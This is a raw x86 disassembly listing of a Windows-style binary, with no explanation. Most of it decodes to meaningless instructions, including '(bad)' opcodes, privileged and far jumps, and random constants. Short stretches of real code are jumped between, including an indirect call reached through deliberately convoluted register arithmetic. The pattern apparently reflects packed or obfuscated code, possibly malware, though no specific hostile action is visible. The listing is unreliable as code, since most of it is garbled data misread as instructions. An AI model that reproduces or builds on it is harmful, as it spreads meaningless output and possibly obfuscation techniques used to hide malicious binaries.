  4050d5:	push   es
  4050d6:	cld    
  4050d7:	xchg   ebp,eax
  4050d8:	mov    ecx,0xb4e9a347
  4050dd:	int    0xd1
  4050df:	jae    0x4050c3
  4050e1:	imul   ebx,DWORD PTR [ebp-0x4b],0x29
  4050e5:	push   esp
  4050e6:	jp     0x405129
  4050e8:	jmp    0xeef8523e
  4050ed:	stc    
  4050ee:	fstp   TBYTE PTR [bx+di+0x73]
  4050f2:	stc    
  4050f3:	outs   dx,BYTE PTR ds:[esi]
  4050f4:	sbb    BYTE PTR [edi+ecx*4],0x22
  4050f8:	push   ebp
  4050f9:	outs   dx,DWORD PTR ds:[esi]
  4050fa:	fwait
  4050fb:	xchg   ebp,eax
  4050fc:	jb     0x40514c
  4050fe:	mov    edx,0x13b4f65
  405103:	jnp    0x405143
  405105:	imul   ebp,DWORD PTR [esi+0x3e],0x19
  405109:	in     al,0xdb
  40510b:	adc    esp,DWORD PTR ds:0xc75a4844
  405111:	xchg   edi,eax
  405112:	scas   al,BYTE PTR es:[edi]
  405113:	mov    esp,0xb4bf9c2
  405118:	mov    ebx,0x52da01d9
  40511d:	lods   al,BYTE PTR ds:[esi]
  40511e:	aad    0x10
  405120:	jmp    0x28cb:0x38bb5f18
  405127:	add    al,bl
  405129:	lds    esi,FWORD PTR [eax+0x22b0cf51]
  40512f:	sahf   
  405130:	stos   DWORD PTR es:[edi],eax
  405131:	into   
  405132:	jge    0x4050f3
  405134:	cmp    al,0xaf
  405136:	arpl   WORD PTR [edx-0x14fcf6bd],sp
  40513c:	iret   
  40513d:	mov    cs,WORD PTR [ebp+0x546dfca8]
  405143:	lods   al,BYTE PTR ds:[esi]
  405144:	push   esi
  405145:	xor    eax,0xd7695908
  40514a:	dec    ebx
  40514b:	imul   eax,DWORD PTR [bx+si+0x3c34],0x8f771fc6
  405154:	push   eax
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0x430f9672]
  4051c5:	xchg   edi,eax
  4051c6:	neg    DWORD PTR [ecx+0x7e7e704a]
  4051cc:	fidivr DWORD PTR [edi+0x7e]
  4051cf:	jle    0x405216
  4051d1:	sbb    edi,edi
  4051d3:	retf   
  4051d4:	add    al,0xd0
  4051d6:	in     al,0x6d
  4051d8:	ret    0x4627
  4051db:	aas    
  4051dc:	inc    ebp
  4051dd:	push   edi
  4051de:	push   edi
  4051df:	xchg   edx,eax
  4051e0:	dec    esi
  4051e1:	(bad)  
  4051e2:	and    al,0xab
  4051e4:	ficom  DWORD PTR [eax+0x4c]
  4051e7:	jmp    0xda2c559c
  4051ec:	dec    ebx
  4051ed:	adc    bh,BYTE PTR [eax]
  4051ef:	jle    0x40526b
  4051f1:	mov    ds:0x5f0fba57,eax
  4051f6:	icebp  
  4051f7:	mov    cl,0x15
  4051f9:	add    eax,0x940e6ace
  4051fe:	jmp    esp
  405200:	lock or ah,BYTE PTR [ebx+0x2d35ce47]
  405207:	mov    esp,0x3c1b8a0
  40520c:	dec    ebp
  40520d:	loop   0x405289
  40520f:	clc    
  405210:	inc    ecx
  405211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405212:	mov    al,ds:0x8a808cee
  405217:	push   cs
  405218:	sub    BYTE PTR [edi+0x4],bl
  40521b:	sbb    eax,0x167dfbc6
  405220:	cdq    
  405221:	pop    edx
  405222:	xor    ch,BYTE PTR [eax]
  405224:	(bad)
  405228:	or     DWORD PTR [ebx+0xc],esi
  40522b:	sub    eax,0x29dd43bd
  405230:	and    eax,0xa9b5ac66
  405235:	jl     0x4051c9
  405237:	ret    
  405238:	loope  0x4052b1
  40523a:	push   esi
  40523b:	sbb    DWORD PTR [esi+0x61],eax
  40523e:	sbb    BYTE PTR [edi-0x30],0x9c
  405242:	out    0x5f,eax
  405244:	dec    edx
  405245:	add    al,0xeb
  405247:	imul   edi,DWORD PTR [edi+0x10],0xffffffea
  40524b:	imul   ebp,DWORD PTR [esi-0x1fd2fe1],0x899186e6
  405255:	ss jno 0x4052b2
  405258:	mov    dl,0x6f
  40525a:	jns    0x4052c6
  40525c:	scas   al,BYTE PTR es:[edi]
  40525d:	pusha  
  40525e:	shl    DWORD PTR [ebp-0x76],cl
  405261:	call   0x3038239e
  405266:	icebp  
  405267:	mov    esp,0x4c7a7da9
  40526c:	sub    edx,DWORD PTR [eax]
  40526e:	mov    ah,0xe5
  405270:	add    al,0xaf
  405272:	hlt    
  405273:	retf   
  405274:	sbb    eax,0x7daf4aa2
  405279:	mov    al,0xe2
  40527b:	nop
  40527c:	enter  0xbafb,0x10
  405280:	add    ah,dh
  405282:	sub    cl,BYTE PTR ds:0x10e543d4
  405288:	lea    ebp,[ebp+0x23]
  40528b:	or     al,0xd2
  40528d:	or     BYTE PTR [eax+0x7eab1a1b],dh
  405293:	jle    0x4052d4
  405295:	lahf   
  405296:	cmc    
  405297:	scas   al,BYTE PTR es:[edi]
  405298:	outs   dx,DWORD PTR ds:[esi]
  405299:	loopne 0x405221
  40529b:	add    esp,DWORD PTR [eax-0x1]
  40529e:	inc    ebx
  40529f:	inc    ebp
  4052a0:	loopne 0x40525e
  4052a2:	jl     0x405289
  4052a4:	outs   dx,BYTE PTR ds:[esi]
  4052a5:	shl    BYTE PTR [edx+edi*1-0x11eb56c3],1
  4052ac:	add    bh,BYTE PTR [esi+0x3c]
  4052af:	jmp    0xebb6948
  4052b4:	jno    0x40532e
  4052b6:	dec    esi
  4052b7:	(bad)  
  4052b9:	je     0x4052da
  4052bb:	mov    dh,0xa4
  4052bd:	sar    ecx,cl
  4052bf:	cwde   
  4052c0:	xor    DWORD PTR [edx+0x44],eax
  4052c3:	jmp    0x40527d
  4052c5:	test   DWORD PTR [eax],esi
  4052c7:	popa   
  4052c8:	dec    ebp
  4052c9:	sub    eax,0x22e0d7bd
  4052ce:	dec    ecx
  4052cf:	ret    
  4052d0:	jle    0x4052d1
  4052d2:	jp     0x4052b5
  4052d4:	pop    ss
  4052d5:	(bad)  
  4052d6:	fnsave [eax+0x70430c09]
  4052dc:	outs   dx,DWORD PTR ds:[esi]
  4052dd:	mov    ebp,0x53108b29
  4052e2:	retf   0xa3c9
  4052e5:	push   ecx
  4052e6:	pop    es
  4052e7:	inc    ecx
  4052e8:	and    ch,bh
  4052ea:	retf   0xb209
  4052ed:	outs   dx,BYTE PTR ds:[esi]
  4052ee:	pop    ecx
  4052ef:	adc    DWORD PTR [edx-0x5155bf11],esp
  4052f5:	add    DWORD PTR [eax+0x27],esi
  4052f8:	in     eax,0xf2
  4052fa:	arpl   WORD PTR [ebx],bp
  4052fc:	add    eax,0xfc62eb2d
  405301:	popf   
  405302:	cmp    edx,edi
  405304:	jecxz  0x4052b4
  405306:	pop    ss
  405307:	push   ds
  405308:	cmp    ecx,DWORD PTR [ecx]
  40530a:	in     al,0x2d
  40530c:	int3   
  40530d:	test   eax,0x8b715920
  405312:	add    al,0x4d
  405314:	dec    edi
  405315:	outs   dx,BYTE PTR ds:[esi]
  405316:	push   ss
  405317:	ins    BYTE PTR es:[edi],dx
  405318:	xchg   edx,eax
  405319:	xor    edx,DWORD PTR [eax-0x32cc6704]
  40531f:	cs out 0xad,al
  405322:	jno    0x40531a
  405324:	aas    
  405325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405326:	call   0x508f:0xee472250
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	hlt    
  40534c:	ds jmp 0x7eb669b2
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x4052de
  405358:	jle    0x4052f5
  40535a:	xor    eax,0xa7cb1184
  40535f:	and    cl,dl
  405361:	aad    0xe
  405363:	lock nop
  405365:	retf   
  405366:	test   WORD PTR [eax+ebp*4-0x44],bp
  40536b:	adc    edx,esi
  40536d:	fwait
  40536e:	inc    esi
  40536f:	sbb    cl,BYTE PTR [ebx+0x1c30ccb4]
  405375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405376:	outs   dx,DWORD PTR ds:[esi]
  405377:	sub    al,0x18
  405379:	test   eax,0x7d2119f3
  40537e:	ins    BYTE PTR es:[edi],dx
  40537f:	push   ebp
  405380:	rol    DWORD PTR [edx],1
  405382:	sub    DWORD PTR ds:0x12957b2e,eax
  405388:	pop    esi
  405389:	pushf  
  40538a:	ins    DWORD PTR es:[edi],dx
  40538b:	fldcw  WORD PTR [eax]
  40538d:	dec    ebp
  40538e:	mov    BYTE PTR [ecx+0x6e],bl
  405391:	dec    edi
  405392:	shl    BYTE PTR [ebx+0x33],cl
  405395:	jecxz  0x4053f3
  405397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405398:	hlt    
  405399:	sbb    cl,BYTE PTR [eax]
  40539b:	sub    al,0x8
  40539d:	mov    ds:0x71ff6cee,al
  4053a2:	call   FWORD PTR [esi-0x6e]
  4053a5:	shl    BYTE PTR ds:0xb4f8d295,cl
  4053ab:	jno    0x40541a
  4053ad:	aam    0x20
  4053af:	shr    BYTE PTR [ebx*1+0x10719d8a],cl
  4053b6:	sar    bh,cl
  4053b8:	mov    ebx,0xf02c14d1
  4053bd:	pop    esi
  4053be:	inc    esi
  4053bf:	js     0x405345
  4053c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053c2:	dec    edx
  4053c3:	mov    WORD PTR [ecx+esi*1],?
  4053c6:	sub    BYTE PTR [eax-0x335556fb],0xb7
  4053cd:	mov    edx,0x4bd2deac
  4053d2:	nop
  4053d3:	pop    eax
  4053d4:	jne    0x405378
  4053d6:	shr    ecx,0x23
  4053d9:	and    DWORD PTR [ecx-0x3b9d2db],ebp
  4053df:	scas   al,BYTE PTR es:[edi]
  4053e0:	xchg   edi,eax
  4053e1:	jl     0x405411
  4053e3:	dec    ecx
  4053e4:	aas    
  4053e5:	push   esi
  4053e6:	fidivr WORD PTR [eax+0x24d9c27c]
  4053ec:	(bad)  
  4053ed:	pop    ebx
  4053ee:	fsqrt  
  4053f0:	ja     0x4053b9
  4053f2:	mov    BYTE PTR [ebp+0x42],al
  4053f5:	push   eax
  4053f6:	aam    0x93
  4053f8:	inc    esp
  4053f9:	cmp    ebx,ebx
  4053fb:	add    eax,0xc0f7ebd8
  405400:	inc    ebx
  405401:	cli    
  405402:	inc    edx
  405403:	pop    ss
  405404:	mov    BYTE PTR [eax+0x6109c863],ch
  40540a:	rol    BYTE PTR [esi-0x39640086],cl
  405410:	mov    edx,0x38924fb0
  405415:	cmp    BYTE PTR [esi-0x66],dl
  405418:	inc    esp
  405419:	scas   al,BYTE PTR es:[edi]
  40541a:	(bad)  
  40541b:	jno    0x40549c
  40541d:	sar    DWORD PTR [eiz*8-0x5e1afe3c],cl
  405424:	or     DWORD PTR [esi],esi
  405426:	push   esp
  405427:	cwde   
  405428:	ja     0x4053fa
  40542a:	cwde   
  40542b:	add    esi,DWORD PTR [ebx]
  40542d:	mov    ebx,0xfaccf397
  405432:	push   ecx
  405433:	mov    dh,0x8c
  405435:	ret    
  405436:	push   ecx
  405437:	iret   
  405438:	push   esp
  405439:	sbb    eax,0xd6c9860b
  40543e:	sbb    DWORD PTR ds:0x98c8da8b,esp
  405444:	fist   DWORD PTR [esi+0x26]
  405447:	ja     0x40549c
  405449:	add    al,ah
  40544b:	call   0x633c42e6
  405450:	out    dx,al
  405451:	add    al,0x95
  405453:	xor    al,0x3
  405455:	adc    DWORD PTR ds:0xe7b1e908,0x7b7d4767
  40545f:	addr16 xor al,0x24
  405462:	mov    edi,0xcf83b059
  405467:	repz inc edx
  405469:	xchg   ebx,eax
  40546a:	or     eax,0xce28453a
  40546f:	xor    BYTE PTR [edi-0x77014037],0x55
  405476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405477:	outs   dx,DWORD PTR ds:[esi]
  405478:	mov    ebp,DWORD PTR [edi+0x58]
  40547b:	(bad)  
  40547c:	in     al,0xcf
  40547e:	xor    DWORD PTR [ebx],esp
  405480:	adc    BYTE PTR [esp+ebp*4-0x46b65f7d],0x16
  405488:	pop    ss
  405489:	pushf  
  40548a:	jg     0x405412
  40548c:	les    eax,FWORD PTR [esi+0x4223974a]
  405492:	dec    esi
  405493:	(bad)  
  405494:	cld    
  405495:	push   0xe5f54026
  40549a:	repnz add DWORD PTR [ecx*8+0x1f98fb16],0x56722a64
  4054a6:	push   bx
  4054a8:	popf   
  4054a9:	mov    al,ds:0x157968f6
  4054ae:	push   ecx
  4054af:	scas   eax,DWORD PTR es:[edi]
  4054b0:	das    
  4054b1:	jmp    0x405468
  4054b3:	call   0x409607
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x50],0x4
  40550f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405510:	xor    edx,0xda7e7e77
  405516:	jg     0x405596
  405518:	jle    0x40554b
  40551a:	js     0x40555b
  40551c:	push   ss
  40551d:	cwde   
  40551e:	fnsave [ebx]
  405520:	jmp    0x9092:0x5d65373a
  405527:	cmp    DWORD PTR [edi],edx
  405529:	in     al,dx
  40552a:	and    ecx,DWORD PTR ds:0xe68aacc1
  405530:	xor    dh,ch
  405532:	aam    0x7e
  405534:	cmp    eax,0xc40820db
  405539:	jle    0x40556e
  40553b:	adc    DWORD PTR [ebp+ecx*8+0x28dbf6bc],esp
  405542:	or     BYTE PTR [edi-0x2b9665e4],cl
  405548:	js     0x40553c
  40554a:	lods   eax,DWORD PTR ds:[esi]
  40554b:	dec    esp
  40554c:	and    ebp,DWORD PTR [eax+0x73]
  40554f:	jmp    0x4af3:0x2b73ad1d
  405556:	scas   al,BYTE PTR es:[edi]
  405557:	sbb    ah,al
  405559:	cmp    DWORD PTR [ecx-0x3f],edx
  40555c:	sbb    dl,BYTE PTR [esi]
  40555e:	test   eax,0x4a4ec1d6
  405563:	dec    ebp
  405564:	shr    edi,1
  405566:	stos   DWORD PTR es:[edi],eax
  405567:	pop    ecx
  405568:	nop
  405569:	scas   eax,DWORD PTR es:[edi]
  40556a:	push   edx
  40556b:	sahf   
  40556c:	in     eax,0xd4
  40556e:	push   ss
  40556f:	xchg   esp,eax
  405570:	xor    DWORD PTR [edx+0x4f4cccbb],ebp
  405576:	stos   BYTE PTR es:[edi],al
  405577:	int3   
  405578:	arpl   dx,bx
  40557a:	xchg   esi,eax
  40557b:	xor    BYTE PTR [edi-0x7c],al
  40557e:	into   
  40557f:	bound  ecx,QWORD PTR [edx+0x5]
  405582:	fdivrp st(2),st
  405584:	inc    esi
  405585:	and    eax,0xb3c39fdc
  40558a:	push   esp
  40558b:	test   al,0xc1
  40558d:	lea    ebx,[ecx+0xd]
  405590:	mov    bh,al
  405592:	dec    edx
  405593:	repnz dec eax
  405595:	ss inc esi
  405597:	pop    ecx
  405598:	add    al,0x9f
  40559a:	lods   al,BYTE PTR ds:[esi]
  40559b:	das    
  40559c:	or     eax,0xc1ff0d56
  4055a1:	mov    bh,0x35
  4055a3:	mov    cl,0xd1
  4055a5:	loop   0x4055b8
  4055a7:	sti    
  4055a8:	fwait
  4055a9:	dec    eax
  4055aa:	dec    esp
  4055ab:	dec    ebx
  4055ac:	cmp    eax,DWORD PTR [ecx+0x6fda1c49]
  4055b2:	aad    0x49
  4055b4:	mov    DWORD PTR [esi+0x487caf65],edi
  4055ba:	xlat   BYTE PTR ds:[ebx]
  4055bb:	xchg   edi,eax
  4055bd:	xor    eax,0xa810e762
  4055c2:	xchg   cl,cl
  4055c4:	jge    0x4055f2
  4055c6:	std    
  4055c7:	repz xor BYTE PTR [eax],cl
  4055ca:	retf   
  4055cb:	and    cl,dl
  4055cd:	and    edx,edi
  4055cf:	jbe    0x4055e2
  4055d1:	dec    ebp
  4055d2:	(bad)  
  4055d3:	jmp    0x9c89:0xd3a87141
  4055da:	add    eax,0xa4060453
  4055df:	rol    DWORD PTR [edi+0x58cad24],1
  4055e5:	test   DWORD PTR [edi+0x7f],esp
  4055e8:	pushf  
  4055e9:	icebp  
  4055ea:	push   ss
  4055eb:	test   al,0xfa
  4055ed:	dec    ebp
  4055ee:	and    eax,0xa242daf
  4055f3:	lds    ebp,FWORD PTR [edi-0x1e]
  4055f6:	(bad)  
  4055f7:	cs inc esp
  4055f9:	jl     0x405606
  4055fb:	lds    esp,FWORD PTR [eax-0x3fbaaf71]
  405601:	pusha  
  405602:	sbb    eax,0x854a1045
  405607:	pop    ebp
  405608:	(bad)  
  405609:	sahf   
  40560a:	and    BYTE PTR ds:0xaefef1e5,0x23
  405611:	mov    ds:0xd0b51d98,eax
  405616:	push   edi
  405618:	repnz pop ds
  40561a:	jp     0x4055a4
  40561c:	mov    BYTE PTR [eax],bh
  40561e:	push   0x89098c61
  405623:	daa    
  405624:	push   esp
  405625:	xchg   edi,eax
  405626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405627:	pop    esp
  405628:	push   es
  405629:	stc    
  40562a:	or     al,0x3e
  40562c:	into   
  40562d:	test   ecx,esi
  40562f:	cli    
  405630:	adc    edx,esp
  405632:	out    dx,eax
  405633:	mov    dl,0x99
  405635:	das    
  405636:	stc    
  405637:	push   ds
  405638:	jp     0x4055f0
  40563a:	add    eax,DWORD PTR [ebp+0x2f3b2b59]
  405640:	xor    ebx,DWORD PTR [ecx-0x68df622f]
  405646:	mov    esi,edi
  405648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405649:	xor    al,0x6a
  40564b:	mov    ebx,0x1c6f11d5
  405650:	pop    esp
  405651:	xchg   esp,eax
  405652:	xchg   esp,eax
  405653:	cld    
  405654:	sbb    al,BYTE PTR [ecx]
  405656:	out    dx,eax
  405657:	inc    eax
  405658:	xor    esp,DWORD PTR [ebp+ebx*2-0x624684b]
  40565f:	mov    ecx,DWORD PTR [ebx+0x4d]
  405662:	push   esp
  405663:	jle    0x40568a
  405665:	arpl   WORD PTR [ecx+0x19],sp
  405668:	push   ecx
  405669:	cs jmp 0x405692
  40566c:	ins    DWORD PTR es:[edi],dx
  40566d:	adc    ebp,DWORD PTR [edi+edi*1]
  405670:	adc    al,0x4f
  405672:	jg     0x405617
  405674:	sbb    al,0x89
  405676:	dec    eax
  405677:	add    DWORD PTR [edx+0x4d8bff45],ecx
  40567d:	clc    
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	(bad)  
  4056a1:	pushf  
  4056a2:	enter  0x5e4b,0x74
  4056a6:	jle    0x405726
  4056a8:	fidivr DWORD PTR [edi+0x7e]
  4056ab:	jle    0x40571d
  4056ad:	sub    BYTE PTR [ebp-0x2eb475ff],cl
  4056b3:	leavew 
  4056b5:	or     dl,BYTE PTR [esi-0xc]
  4056b8:	add    al,0xc3
  4056ba:	mov    ds:0xa718fc9a,al
  4056bf:	push   eax
  4056c0:	repnz cmc 
  4056c2:	arpl   ax,sp
  4056c4:	jl     0x4056e5
  4056c6:	retf   
  4056c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c8:	xor    eax,0x6779c6ea
  4056cd:	cmp    esi,DWORD PTR [ecx]
  4056cf:	xchg   edi,eax
  4056d0:	push   ebx
  4056d1:	(bad)  
  4056d3:	add    DWORD PTR [edi-0x10],0xffffffed
  4056d7:	add    ah,BYTE PTR [edx]
  4056d9:	out    0x7f,eax
  4056db:	and    BYTE PTR [esi-0xa],ah
  4056de:	icebp  
  4056df:	mov    bl,BYTE PTR [esi]
  4056e1:	and    DWORD PTR [eax],0xc0c69fe7
  4056e7:	mov    dl,0xec
  4056e9:	jb     0x405689
  4056eb:	push   edx
  4056ec:	js     0x405741
  4056ee:	test   BYTE PTR [esi-0x4b],0x41
  4056f2:	cmp    eax,0x3f489d4
  4056f7:	dec    edi
  4056f8:	fucomi st,st(3)
  4056fa:	bound  eax,QWORD PTR [esi-0x18]
  4056fd:	out    0x2b,eax
  4056ff:	lock retf 0xffb8
  405703:	and    DWORD PTR [edi-0x658fe08d],eax
  405709:	ins    DWORD PTR es:[edi],dx
  40570a:	rol    BYTE PTR [esi+0x33],cl
  40570d:	push   eax
  40570e:	cli    
  40570f:	and    esi,0xffffff92
  405712:	or     eax,edx
  405714:	mov    ch,0x8a
  405716:	sbb    bl,BYTE PTR [ebp+0x24c93778]
  40571c:	into   
  40571d:	cmp    edx,esp
  40571f:	iret   
  405720:	ins    DWORD PTR es:[edi],dx
  405721:	xor    al,0xb3
  405723:	push   es
  405724:	mov    WORD PTR [ecx+0x73],?
  405727:	sub    al,0x31
  405729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40572a:	mov    cl,0x38
  40572c:	add    eax,0xe17c80ed
  405731:	cs repnz adc bh,ch
  405735:	lahf   
  405736:	add    ah,BYTE PTR [esi-0x5ecba1d8]
  40573c:	cdq    
  40573d:	xchg   esi,ecx
  40573f:	xor    edx,0xffffff98
  405742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405743:	sbb    eax,0xe72cb87f
  405748:	shr    edx,cl
  40574a:	test   DWORD PTR [ecx+ebp*1],ecx
  40574d:	rol    BYTE PTR [ebp-0x64],1
  405750:	lods   eax,DWORD PTR ds:[esi]
  405751:	or     ebx,ebp
  405753:	mov    esi,0x38d62273
  405758:	or     cl,BYTE PTR [edi+0x1237171b]
  40575e:	adc    ah,bl
  405760:	or     DWORD PTR [ecx+ecx*1],edi
  405763:	dec    esi
  405764:	cdq    
  405765:	and    BYTE PTR [ecx-0x277f67bd],bl
  40576b:	mov    dh,0xf
  40576d:	pop    eax
  40576e:	mov    eax,ds:0x8fb42ef3
  405773:	data16 jbe 0x40579c
  405776:	xchg   edi,eax
  405777:	push   eax
  405778:	sti    
  405779:	sub    cl,ah
  40577b:	mul    BYTE PTR [edi-0x7443840a]
  405781:	cmp    BYTE PTR [eax-0x443f32eb],0x8c
  405788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405789:	inc    esi
  40578a:	xlat   BYTE PTR ds:[ebx]
  40578b:	mov    eax,0x21a48a4d
  405790:	into   
  405791:	ror    bh,1
  405793:	data16 fisttp QWORD PTR [ebx-0x13]
  405797:	push   0xb0e6c86a
  40579c:	xchg   BYTE PTR [eax],al
  40579e:	data16 or ch,cl
  4057a1:	jne    0x40576b
  4057a3:	cmp    ebx,DWORD PTR [ebp-0x15702d51]
  4057a9:	pop    ebx
  4057aa:	(bad)  
  4057ab:	out    dx,al
  4057ac:	nop
  4057ad:	xchg   esp,eax
  4057ae:	daa    
  4057af:	fdiv   st(4),st
  4057b1:	adc    eax,DWORD PTR [ebp-0x70]
  4057b4:	aaa    
  4057b5:	fstp   QWORD PTR ds:0x8d0c4a32
  4057bb:	mov    WORD PTR [eax-0x28a3ea15],fs
  4057c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c2:	and    edx,ebx
  4057c4:	cwde   
  4057c5:	jbe    0x4057ef
  4057c7:	out    dx,al
  4057c8:	adc    bl,BYTE PTR ds:[ebx+esi*1]
  4057cc:	mov    al,ds:0x184ac599
  4057d1:	sbb    al,0xc8
  4057d3:	test   DWORD PTR [esi+0x2772d6c],0x6a423bc7
  4057dd:	xchg   BYTE PTR [edx+0x50],bl
  4057e0:	jb     0x40579d
  4057e2:	mov    al,ds:0xc22ad2c3
  4057e7:	aad    0x80
  4057e9:	arpl   WORD PTR [ecx+edi*2+0x29df6605],bp
  4057f0:	not    BYTE PTR ds:0xcd0d3ae1
  4057f6:	ret    0xf3d5
  4057f9:	jo     0x405850
  4057fb:	test   al,0x4a
  4057fd:	fstp   TBYTE PTR [esp+edi*8-0x55]
  405801:	aad    0x60
  405803:	pop    eax
  405804:	mov    ebx,0xfeecd67f
  405809:	or     bh,bh
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	scas   eax,DWORD PTR es:[edi]
  405857:	shl    BYTE PTR [edx],1
  405859:	cmp    DWORD PTR [edx],0xda7e7e0a
  40585f:	jg     0x4058df
  405861:	jle    0x40585a
  405863:	push   cs
  405864:	neg    ebp
  405866:	inc    ebx
  405867:	push   ds
  405868:	pop    ebx
  405869:	xor    BYTE PTR [edx-0x5d],bh
  40586c:	pop    ds
  40586d:	cld    
  40586e:	jae    0x405875
  405870:	and    dl,BYTE PTR [ebx-0x5496dbbb]
  405876:	mov    ds:0x1bff2322,al
  40587b:	and    DWORD PTR [esi-0xcf1df0d],ebp
  405881:	push   ebp
  405882:	and    BYTE PTR [edi],0x24
  405885:	add    ebx,ecx
  405887:	ss push ss
  405889:	clc    
  40588a:	mov    al,ds:0x83f07936
  40588f:	jnp    0x40589f
  405891:	push   ds
  405892:	push   0x48
  405894:	push   ebp
  405895:	push   edx
  405896:	jl     0x4058df
  405898:	rcl    DWORD PTR [edi+0x28b96ed0],cl
  40589e:	sub    al,0x7
  4058a0:	xor    DWORD PTR [edx+edx*8+0x7300ba62],edi
  4058a7:	jecxz  0x4058de
  4058a9:	loopne 0x405857
  4058ab:	test   BYTE PTR ds:0xa224e963,cl
  4058b1:	add    al,0xcb
  4058b3:	mov    ebx,0x25e39ca0
  4058b8:	sar    DWORD PTR [ebp+0x7e],1
  4058bb:	mov    DWORD PTR [ebp+ecx*4-0x3c],esi
  4058bf:	dec    ebx
  4058c0:	loop   0x4058d8
  4058c2:	loop   0x40593d
  4058c4:	add    ah,0xbd
  4058c7:	ret    0xf243
  4058ca:	sub    DWORD PTR [ebp-0x10343e58],eax
  4058d0:	fisubr DWORD PTR [ebx]
  4058d2:	jge    0x4058a5
  4058d4:	popa   
  4058d5:	or     al,0xd4
  4058d7:	mov    eax,0xe04cbf25
  4058dc:	(bad)  
  4058dd:	enter  0xd801,0x76
  4058e1:	outs   dx,DWORD PTR ds:[esi]
  4058e2:	cs mov al,0x15
  4058e5:	data16 fst QWORD PTR [edi-0x60]
  4058e9:	shr    DWORD PTR [ecx],cl
  4058eb:	sbb    BYTE PTR [ebp+0x27],bl
  4058ee:	xchg   DWORD PTR [edi],esp
  4058f0:	xchg   ebx,eax
  4058f1:	dec    ebx
  4058f2:	or     eax,0x659e5e07
